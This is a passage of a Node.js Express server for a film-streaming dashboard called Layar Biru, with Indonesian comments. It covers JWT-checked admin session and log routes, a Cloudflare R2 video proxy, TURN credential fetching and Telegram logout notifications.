    // per viewer → dengan 10 viewer = 2 SSE broadcast/detik ke semua admin client → beban server naik.
    const filmChanged = req.body.film      != null && req.body.film      !== s.film;
    const camChanged  = req.body.camActive != null && req.body.camActive !== s.camActive;
    const micChanged  = req.body.micActive != null && req.body.micActive !== s.micActive;
    s.film      = req.body.film      ?? s.film;
    s.camActive = req.body.camActive ?? s.camActive;
    s.micActive = req.body.micActive ?? s.micActive;
    if (filmChanged || camChanged || micChanged) broadcastSessions();
  }
  res.json({ success:true });
});

app.post('/api/logout', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (token) {
    try {
      const d    = jwt.verify(token, JWT_SECRET);
      const sesi = activeSessions.get(token);

      // ── Cek apakah ini logout beneran atau logout dari refresh ──
      // Saat viewer refresh, beforeunload lama mungkin masih trigger
      // sendBeacon logout sebelum fix diterapkan, atau ada edge case lain.
      // Jika socket viewer dengan sessionId yang sama masih aktif
      // (sudah reconnect), jangan hapus sesinya.
      if (sesi) {
        const sessionId = sesi.id;
        let socketStillAlive = false;
        io.sockets.sockets.forEach(s => {
          if (s._role === 'viewer' && s._sessionId === sessionId) {
            socketStillAlive = true;
          }
        });
        if (socketStillAlive) {
          // Viewer sudah reconnect — ini kemungkinan beacon dari refresh lama, abaikan
          console.log(`[LOGOUT] Diabaikan — viewer ${d.name} masih terhubung via socket`);
          return res.json({ success: true });
        }
      }

      const dur  = sesi ? Math.floor((Date.now() - sesi.startTime) / 60000) : 0;
      activeSessions.delete(token);
      broadcastSessions();
      addServerLog(d.name, 'logout / mengakhiri sesi', '#F2A93B', 'logout');
      if (d.role === 'viewer') {
        const waktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Makassar' });
        sendTelegramNotif(
`🔴 <b>Pengguna Keluar</b>\n\n👤 <b>Nama</b>    : ${d.name}\n🕐 <b>Waktu</b>   : ${waktu} WITA\n⏱ <b>Durasi</b>  : ${dur} menit\n\n— <i>Layar Biru Dashboard</i>`
        );
      }
    } catch {}
  }
  res.json({ success:true });
});

app.get('/api/sessions', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const u = jwt.verify(token, JWT_SECRET);
    if (u.role !== 'admin') return res.status(403).json({ success:false });
    res.json({ success:true, sessions: getSessionsPayload() });
  } catch { res.status(401).json({ success:false }); }
});

app.get('/api/logs', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const u = jwt.verify(token, JWT_SECRET);
    if (u.role !== 'admin') return res.status(403).json({ success:false });
    res.json({ success:true, logs: serverLogs });
  } catch { res.status(401).json({ success:false }); }
});

app.delete('/api/logs', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const u = jwt.verify(token, JWT_SECRET);
    if (u.role !== 'admin') return res.status(403).json({ success:false });
    serverLogs = [];
    res.json({ success:true });
  } catch { res.status(401).json({ success:false }); }
});

app.post('/api/kick', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const u = jwt.verify(token, JWT_SECRET);
    if (u.role !== 'admin') return res.status(403).json({ success:false });
    const { sessionId, name } = req.body;
    if (!sessionId) return res.status(400).json({ success:false, message:'sessionId wajib diisi' });
    io.to(`viewer:${sessionId}`).emit('warn-viewer');
    addServerLog('Admin', `peringatan dikirim ke: ${name || sessionId}`, '#F2B94B', 'warn');
    res.json({ success:true });
  } catch { res.status(401).json({ success:false }); }
});

app.get('/api/sessions/stream', (req, res) => {
  try { jwt.verify(req.query.token, JWT_SECRET); } catch { return res.status(401).end(); }
  res.setHeader('Content-Type',  'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection',    'keep-alive');
  res.flushHeaders();
  res.write(`data: ${JSON.stringify({ type:'sessions', data: getSessionsPayload() })}\n\n`);
  sseClients.add(res);
  const hb = setInterval(() => { try { res.write(`: ping\n\n`); } catch {} }, 20000);
  req.on('close', () => { clearInterval(hb); sseClients.delete(res); });
});

// ================================================================
// FILMS — Cloudflare R2
// ================================================================

// GET /api/films — ambil daftar film dari bucket Cloudflare R2
app.get('/api/films', async (req, res) => {
  // SECURITY FIX: Wajib login sebelum bisa lihat daftar film
  const token = (req.headers['authorization'] || '').split(' ')[1];
  if (!token) return res.status(401).json({ success: false, message: 'Unauthorized' });
  try { jwt.verify(token, JWT_SECRET); } catch { return res.status(401).json({ success: false, message: 'Token tidak valid' }); }

  try {
    const films = await fetchFilms();
    res.json({ success: true, films, source: 'r2' });
  } catch (err) {
    console.error('[FILMS] GET error:', err.message);
    res.json({ success: true, films: [], source: 'r2' });
  }
});

// POST /api/films/refresh — paksa refresh cache R2 (admin only)
app.post('/api/films/refresh', async (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const u = jwt.verify(token, JWT_SECRET);
    if (u.role !== 'admin') return res.status(403).json({ success:false });
    filmsCache = [];
    filmsCacheTime  = 0;
    const films = await fetchFilms();
    res.json({ success: true, films, count: films.length });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Cleanup sesi timeout
// OPTIMASI JARINGAN: Naikkan timeout dari 30s ke 45s karena ping client sekarang 15s.
// Sebelumnya ping 5s → timeout 30s (6x ping). Sekarang ping 15s → timeout 45s (3x ping).
// Margin 3 ping cukup toleran terhadap jaringan fluktuatif tanpa mengorbankan deteksi offline.
setInterval(() => {
  const now = Date.now(); let changed = false;
  for (const [token, s] of activeSessions) {
    if (now - s.lastPing > 45000) { activeSessions.delete(token); changed = true; }
  }
  if (changed) broadcastSessions();
}, 10000);

// Lag Fix 5 (lanjutan): Broadcast sesi setiap 15 detik agar durasi di dashboard admin
// tetap terupdate, tanpa harus bergantung pada ping setiap viewer.
setInterval(() => {
  if (activeSessions.size > 0 && sseClients.size > 0) broadcastSessions();
}, 15000);

// ================================================================
// PROXY VIDEO — stream video dari Cloudflare R2 lewat server
// GET /api/proxy-video?id=OBJECT_KEY&token=TOKEN
// ================================================================
app.get('/api/proxy-video', async (req, res) => {
  const token = (req.headers['authorization'] || '').split(' ')[1] || req.query.token;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  try { jwt.verify(token, JWT_SECRET); } catch { return res.status(401).json({ error: 'Token tidak valid' }); }

  const key = req.query.id;
  if (!key || typeof key !== 'string') return res.status(400).json({ error: 'Parameter id wajib diisi' });

  // Keamanan: hanya boleh memutar file video (dan di dalam prefix jika diset)
  if (!VIDEO_EXT_REGEX.test(key) || (R2_PREFIX && !key.startsWith(R2_PREFIX))) {
    return res.status(403).json({ error: 'File tidak diizinkan' });
  }

  try {
    const out = await r2.send(new GetObjectCommand({
      Bucket: R2_BUCKET,
      Key:    key,
      Range:  req.headers['range'] || undefined,   // dukung seek / partial content
    }));

    const ext = key.split('.').pop().toLowerCase();
    res.status(out.ContentRange ? 206 : 200);
    res.setHeader('Content-Type',        out.ContentType || VIDEO_MIME[ext] || 'video/mp4');
    res.setHeader('Accept-Ranges',       'bytes');
    res.setHeader('Cache-Control',       'private, max-age=3600');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Disposition', 'inline');
    if (out.ContentLength != null) res.setHeader('Content-Length', out.ContentLength);
    if (out.ContentRange)          res.setHeader('Content-Range',  out.ContentRange);

    out.Body.on('error', (e) => {
      console.error('[PROXY] Stream err:', e.message);
      res.destroy();
    });
    req.on('close', () => out.Body.destroy());
    out.Body.pipe(res);

  } catch (err) {
    const code = err.$metadata?.httpStatusCode;
    if (code === 416) return res.status(416).end();                       // range tidak valid
    if (err.name === 'NoSuchKey' || code === 404) {
      if (!res.headersSent) res.status(404).json({ error: 'Video tidak ditemukan di R2' });
      return;
    }
    console.error('[PROXY] R2 error:', err.name, err.message);
    if (!res.headersSent) res.status(502).json({ error: 'Video tidak dapat dimuat dari R2' });
  }
});

// ================================================================
// CLOUDFLARE TURN CREDENTIALS
// ================================================================
app.get('/api/turn-credentials', async (req, res) => {
  const token = (req.headers['authorization'] || '').split(' ')[1];
  if (!token) return res.status(401).json({ success: false, message: 'Unauthorized' });
  try { jwt.verify(token, JWT_SECRET); } catch { return res.status(401).json({ success: false, message: 'Token tidak valid' }); }

  if (cfTurnCache && (Date.now() - cfTurnCacheTime) < CF_TURN_TTL) {
    return res.json({ success: true, iceServers: cfTurnCache, cached: true });
  }

  if (!CF_TURN_KEY_ID || !CF_TURN_API_KEY) {
    return res.json({ success: false, iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' }
    ]});
  }

  try {
    const cfRes = await fetch(
      `https://rtc.live.cloudflare.com/v1/turn/keys/${CF_TURN_KEY_ID}/credentials/generate`,
      {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${CF_TURN_API_KEY}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ ttl: 86400 })
      }
    );
    if (!cfRes.ok) throw new Error(`Cloudflare API ${cfRes.status}: ${await cfRes.text()}`);
    const data = await cfRes.json();
    // FIX: Cloudflare API mengembalikan iceServers sebagai object tunggal,
    // bukan array. RTCPeerConnection dan client butuh array. Normalize di sini.
    const iceServersArr = Array.isArray(data.iceServers)
      ? data.iceServers
      : (data.iceServers ? [data.iceServers] : []);
    cfTurnCache     = iceServersArr;
    cfTurnCacheTime = Date.now();
    console.log(`[TURN] Cloudflare credentials OK (${iceServersArr.length} servers)`);
    res.json({ success: true, iceServers: iceServersArr });
  } catch (err) {
    console.error('[TURN] Gagal:', err.message);
    res.json({ success: false, iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' }
    ]});
  }
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// ===========================
// START
// ===========================
server.listen(PORT, () => {
  console.log(`\n🎬 Layar Biru v2.1 berjalan di port ${PORT}`);
  console.log(`📡 Socket.IO signaling aktif`);
  console.log(`☁️  Cloudflare R2 bucket: ${R2_BUCKET}${R2_PREFIX ? ' (prefix: ' + R2_PREFIX + ')' : ''}`);
  console.log('');
  // Pre-load daftar film dari R2 saat startup
  fetchFilms().then(f => console.log(`[R2] ${f.length} film di-cache saat startup`));
});

function gracefulShutdown(signal) {
  console.log(`\n[${signal}] Menutup server...`);
  io.emit('server-restart', { message: 'Server sedang restart.' });
  server.close(() => { process.exit(0); });
  setTimeout(() => { process.exit(1); }, 8000);
}
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
